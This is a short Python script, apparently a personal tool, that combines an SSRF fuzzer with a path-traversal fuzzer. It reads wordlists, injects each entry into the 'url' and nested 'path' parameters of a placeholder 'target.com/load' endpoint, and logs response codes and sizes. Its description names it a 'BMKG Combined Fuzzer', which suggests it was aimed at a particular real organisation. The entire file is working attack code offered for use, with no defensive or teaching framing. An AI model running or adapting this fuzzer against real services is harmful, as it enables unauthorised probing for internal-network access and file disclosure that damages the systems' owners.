                                                                                                                 
import requests
from urllib.parse import quote
import argparse

base_url = "https://target.com/load"
headers = {
    "User-Agent": "Mozilla/5.0 (JagFuzz)"
}

def log_result(payload, status, length):
    print(f"[{status}] {payload} (length={length})")
    with open("hasil.log", "a") as f:
        f.write(f"[{status}] {payload} (length={length})\n")

def fuzz_combined(ssrf_wordlist, traversal_wordlist):
    with open(ssrf_wordlist, "r") as ssrf_file:
        ssrf_targets = [line.strip() for line in ssrf_file if line.strip()]
    
    with open(traversal_wordlist, "r") as trav_file:
        traversal_paths = [line.strip() for line in trav_file if line.strip()]
    
    for target in ssrf_targets:
        # Test SSRF only
        payload = f"?url={quote(target)}"
        try:
            r = requests.get(base_url + payload, headers=headers, timeout=5)
            log_result(payload, r.status_code, len(r.content))
        except Exception as e:
            print(f"[ERR SSRF] {target}: {e}")
            continue
          #Traversal
        print(f"\n🔍 Mulai traversal dari SSRF target: {target}\n")
        for path in traversal_paths:
            full_url = f"{target}/?path={quote(path)}"
            payload = f"?url={quote(full_url)}"
            try:
                r = requests.get(base_url + payload, headers=headers, timeout=5)
                log_result(payload, r.status_code, len(r.content))
            except Exception as e:
                print(f"[ERR PATH] {full_url}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BMKG Combined Fuzzer by Anggi")
    parser.add_argument("-s", "--ssrf", required=True, help="Wordlist SSRF (e.g. ssrf.txt)")
    parser.add_argument("-t", "--traversal", required=True, help="Wordlist Traversal (e.g. traversal.txt)")
    args = parser.parse_args()

    fuzz_combined(args.ssrf, args.traversal)



